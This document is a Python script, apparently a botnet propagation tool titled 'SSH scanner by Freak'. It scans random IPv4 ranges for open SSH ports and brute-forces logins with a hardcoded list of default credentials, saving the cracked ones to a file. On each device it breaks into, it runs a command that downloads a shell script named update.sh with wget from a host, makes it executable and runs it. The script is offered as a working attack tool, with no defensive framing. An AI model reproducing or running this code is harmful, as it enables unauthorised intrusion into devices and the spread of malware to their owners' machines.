#!/usr/bin/python
#Phaaaat hax SSH scanner by Freak
import sys, re, os, paramiko, socket, random, itertools
from threading import Thread
from time import sleep
paramiko.util.log_to_file("ssh.log")
rekdevice="cd /tmp; wget http://0.0.0.0/update.sh; busybox wget http://0.0.0.0/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh" #command to send

print "S-S-SUUUPER fast SSH scanner by Freak"
print

maxthreads = 376

global fh
fh = open("vulnz.txt","a+")

global passwords
passwords = [
    "root:root",
    "root:admin",
    "root:password",
    "root:default",
    "root:toor",
    "admin:admin",
    "admin:1234",
    "ubnt:ubnt",
    "vagrant:vagrant",
    "root:ubnt",
    "telnet:telnet",
    "guest:guest",
    "root:vagrant",
    "pi:raspberry",
    "default:",
    "admin:password",
    "cisco:cisco",
    "root:5up",
    "user:password",
    "user:user",
    "root:debian",
    "root:alpine",
    "root:ceadmin",
    "root:indigo",
    "root:linux",
    "root:rootpasswd",
    "root:timeserver"
]


def SSHBrute(IP):
    global fh
    global passwords
    cracked = False
    for passwd in passwords:
        if cracked:
            return
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(IP, port = 22, username=passwd.split(":")[0], password=passwd.split(":")[1], key_filename=None, timeout=3)
            print "Freaks next root ->"+ passwd + ":" + IP
            cracked = True
            fh.write(passwd + ":" + IP + "\n")
            fh.flush()
            ssh.exec_command(rekdevice)
            sleep(20)
            ssh.close()
        except Exception as e:
            pass

def isRunningSSH(IP):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.37)
        result = s.connect_ex((IP, 22))
        s.close()
        if result == 0:
            return True
    except:
        return False

def ip_range(input_string):
    octets = input_string.split('.')
    chunks = [map(int, octet.split('-')) for octet in octets]
    ranges = [range(c[0], c[1] + 1) if len(c) == 2 else c for c in chunks]
    addresses = []
    for address in itertools.product(*ranges):
        addresses.append('.'.join(map(str, address)))
    random.shuffle(addresses)
    for address in addresses:
        yield address

def gen_IP():
    first = random.choice(["2", "5", "31", "37", "41", "46", "50", "65", "67", "94", "95", "96", "118", "119", "122", "161", "168", "176", "178", "179", "180", "183", "185", "187", "188", "191", "198", "201"])
    ip = ".".join([first,str(random.randrange(1,256)),
    str(random.randrange(1,256)),str(random.randrange(1,256))])
    return ip

def HaxThread():
    while 1:
        try:
            IP = gen_IP()
            if isRunningSSH(IP):
                if isRunningSSH('.'.join(IP.split(".")[:3])+".2") and isRunningSSH('.'.join(IP.split(".")[:3])+".254"):#entire ip range most likely pointed to one server
                    SSHBrute(IP)
                else:
                    for IP in ip_range('.'.join(IP.split(".")[:3])+".0-255"):
                        if isRunningSSH(IP):
                            SSHBrute(IP)
        except Exception as e:
            print str(e)
            pass

global threads
threads = 0
for i in xrange(0,maxthreads):
    try:
        Thread(target = HaxThread, args = ()).start()
        threads += 1
    except Exception as e:
        pass